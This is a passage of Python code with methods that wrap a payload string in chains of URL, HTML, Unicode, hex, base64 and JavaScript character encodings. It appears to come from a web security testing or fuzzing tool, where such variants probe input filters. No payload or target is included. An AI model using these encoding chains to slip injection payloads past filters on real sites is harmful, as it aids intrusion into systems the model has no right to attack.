    # ===============================================================
    #  ENCODING CHAINS  (multi-layer encoding)
    # ===============================================================

    def encoding_chain(self, payload: str, chain: list[str]) -> str:
        """Apply a sequence of encoding layers."""
        result = payload
        for layer in chain:
            if layer == "url":
                result = urllib.parse.quote(result, safe="")
            elif layer == "double_url":
                result = urllib.parse.quote(urllib.parse.quote(result, safe=""), safe="")
            elif layer == "html":
                result = html.escape(result)
            elif layer == "unicode":
                result = "".join(f"\\u{ord(c):04x}" for c in result)
            elif layer == "hex":
                result = "".join(f"\\x{ord(c):02x}" for c in result)
            elif layer == "base64":
                result = base64.b64encode(result.encode()).decode()
            elif layer == "jschar":
                result = "+".join(f"String.fromCharCode({ord(c)})" for c in result)
            elif layer == "jsunicode":
                result = "".join(f"\\u{ord(c):04x}" for c in result)
            elif layer == "jsoctal":
                result = "".join(f"\\{oct(ord(c))[2:]}" for c in result)
        return result

    def generate_encoding_chains(self, payload: str) -> list[str]:
        """Generate multiple encoding-chain variants of a payload."""
        chains = [
            ["url"], ["url", "url"], ["html"], ["url", "html"],
            ["html", "url"], ["unicode"], ["hex"], ["jschar"],
            ["jsunicode"], ["url", "html", "url"],
        ]
        results = []
        for chain in chains:
            encoded = self.encoding_chain(payload, chain)
            if encoded != payload:
                results.append(encoded)
        return results

